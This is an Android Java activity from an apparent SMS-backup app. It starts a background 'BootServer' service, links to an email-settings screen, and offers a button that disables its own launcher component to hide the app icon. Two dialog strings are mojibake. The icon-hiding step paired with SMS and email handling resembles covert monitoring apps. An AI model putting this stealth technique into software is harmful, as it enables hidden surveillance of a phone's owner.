package com.yfm.sms;

import android.app.Activity;
import android.app.AlertDialog.Builder;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.Toast;

public class BakSmsActivity extends Activity {
    /** Called when the activity is first created. */
	private Button set,yincang;
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        set=(Button)super.findViewById(R.id.set);
        yincang=(Button)super.findViewById(R.id.yincang);
        Intent intent=new Intent(this,BootServer.class);
		this.startService(intent);
		set.setOnClickListener(new setOnClickListener());
		yincang.setOnClickListener(new yincangOnClickListener());
		
		
    }
    class setOnClickListener implements OnClickListener{

		@Override
		public void onClick(View arg0) {
			// TODO Auto-generated method stub
			Intent intent=new Intent(BakSmsActivity.this,SetEmailActivity.class);
			intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
			BakSmsActivity.this.startActivity(intent);
		}
    	
    }
    class yincangOnClickListener implements OnClickListener{

		@Override
		public void onClick(View v) {
			// TODO Auto-generated method stub
			Builder builder=new Builder(BakSmsActivity.this);
			builder.setTitle("Òþ²ØÍ¼±ê");
			builder.setPositiveButton("Òþ²Ø", new DialogInterface.OnClickListener() {
				
				@Override
				public void onClick(DialogInterface dialog, int which) {
					// TODO Auto-generated method stub
					PackageManager pm=BakSmsActivity.this.getPackageManager();
					pm.setComponentEnabledSetting(BakSmsActivity.this.getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
					BakSmsActivity.this.finish();
				}
			});
			builder.create().show();
		}
    	
    }
}